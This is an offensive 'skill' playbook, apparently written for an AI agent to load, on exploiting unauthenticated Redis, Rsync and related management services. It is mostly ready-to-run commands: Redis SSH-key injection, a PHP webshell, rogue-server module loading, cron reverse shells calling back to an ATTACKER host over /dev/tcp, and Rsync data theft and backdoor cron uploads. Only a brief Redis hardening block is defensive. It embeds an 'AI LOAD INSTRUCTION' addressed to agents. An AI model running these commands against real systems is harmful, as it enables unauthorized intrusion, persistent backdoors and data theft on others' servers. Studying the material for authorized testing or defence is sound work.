---
name: unauthorized-access-common-services
description: "Common unauthorized service access: Redis, Rsync, PHP-FPM, AJP Ghostcat, Hadoop YARN, H2 Console management-plane exposure. Signals: unauthorized access, Redis, Hadoop, AJP."
zh-signals: "常见服务未授权访问:Redis/Rsync/PHP-FPM/AJP Ghostcat/Hadoop YARN/H2 Console 等管理面暴露。信号:未授权访问,redis,hadoop,ajp。"
when-to-use: >-
  Unauthorized access playbook for common exposed services. Use when Redis, Rsync, PHP-FPM, AJP/Ghostcat, Hadoop YARN, H2 Console, or similar management interfaces are exposed without authentication.
---

# SKILL: Unauthorized Access to Common Services — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert techniques for exploiting unauthenticated or weakly authenticated management services. Covers Redis write-to-RCE, Rsync data theft, PHP-FPM code execution, Ghostcat AJP file read, Hadoop YARN job submission, and H2 Console JNDI. These are infrastructure-level findings distinct from web application vulnerabilities.

## 0. RELATED ROUTING

- [ssrf-server-side-request-forgery](../ssrf-server-side-request-forgery/SKILL.md) when these services are reachable via SSRF (e.g., SSRF → Redis)
- [jndi-injection](../jndi-injection/SKILL.md) when H2 Console or similar accepts JNDI connection strings
- [deserialization-insecure](../deserialization-insecure/SKILL.md) when RMI Registry or T3 protocol is exposed
- [network-protocol-attacks](../network-protocol-attacks/SKILL.md) for layer 2/3 attacks during service enumeration
- [reverse-shell-techniques](../reverse-shell-techniques/SKILL.md) for shell payloads after gaining command execution

### Comprehensive Port Reference

Also load PORT_SERVICE_MATRIX.md when you need:
- Full exploitation matrix organized by port number (20+ services)
- Enumeration, brute force, and post-exploitation per service
- Quick triage during nmap/masscan output analysis

---

## 1. DISCOVERY — PORT SCANNING

```bash
nmap -sV -p 6379,873,9000,8009,8088,8082,1099,9200,5984,2375,27017,11211 TARGET

# Key ports:
# 6379  — Redis
# 873   — Rsync
# 9000  — PHP-FPM (FastCGI)
# 8009  — AJP (Tomcat Ghostcat)
# 8088  — Hadoop YARN ResourceManager
# 8082  — H2 Console (or embedded in Spring Boot)
# 1099  — Java RMI Registry
# 9200  — Elasticsearch
# 5984  — CouchDB
# 2375  — Docker API
# 27017 — MongoDB
# 11211 — Memcached
```

---

## 2. REDIS (PORT 6379)

### Detection

```bash
redis-cli -h TARGET ping
# Response: PONG = unauthenticated access confirmed

redis-cli -h TARGET INFO server
# Returns Redis version, OS, config
```

### Write SSH Authorized Keys

```bash
# Generate key pair:
ssh-keygen -t rsa -f redis_rsa

# Write public key to Redis, then dump to authorized_keys:
cat redis_rsa.pub | redis-cli -h TARGET -x set ssh_key
redis-cli -h TARGET config set dir /root/.ssh
redis-cli -h TARGET config set dbfilename authorized_keys
redis-cli -h TARGET save

# Connect:
ssh -i redis_rsa root@TARGET
```

### Write Crontab (Reverse Shell)

```bash
redis-cli -h TARGET
> set x "\n\n*/1 * * * * bash -i >& /dev/tcp/ATTACKER/4444 0>&1\n\n"
> config set dir /var/spool/cron/
> config set dbfilename root
> save
```

### Write Webshell

```bash
redis-cli -h TARGET
> set webshell "<?php system($_GET['cmd']); ?>"
> config set dir /var/www/html/
> config set dbfilename shell.php
> save
# Access: http://TARGET/shell.php?cmd=id
```

### Master-Slave Replication RCE

Use `redis-rogue-server` to exploit master-slave replication for loading malicious `.so` module:

```bash
python3 redis-rogue-server.py --rhost TARGET --lhost ATTACKER
# Loads module via SLAVEOF → MODULE LOAD → system.exec
```

### Hardening

```
requirepass STRONG_PASSWORD
bind 127.0.0.1
protected-mode yes
rename-command CONFIG ""
rename-command FLUSHALL ""
```

---

## 3. RSYNC (PORT 873)

### Detection

```bash
rsync TARGET::
# Lists available modules (shares) if anonymous access allowed

rsync -av TARGET::MODULE_NAME /tmp/loot/
# Download entire module contents
```

### Exploitation — Write Crontab

```bash
# Create reverse shell cron:
echo '*/1 * * * * bash -i >& /dev/tcp/ATTACKER/4444 0>&1' > /tmp/evil_cron

# Upload to target's crontab (if writable module maps to /etc/ or similar):
rsync -av /tmp/evil_cron TARGET::MODULE/cron.d/backdoor
```

### Hardening

```

> 📎 Detailed content (full examples / references / data tables) has been split into `reference.md` in the same directory; use Read to load the relevant section on demand.

> 📎 **Reference Document Notice**: this skill is adapted from an upstream open-source repository; the following reference document is **not distributed with this library**: `PORT_SERVICE_MATRIX.md`. The key points of the related topics are retained in the corresponding descriptions in this document; if you need the expanded content, grep the library using keywords from the body text or search on your own.
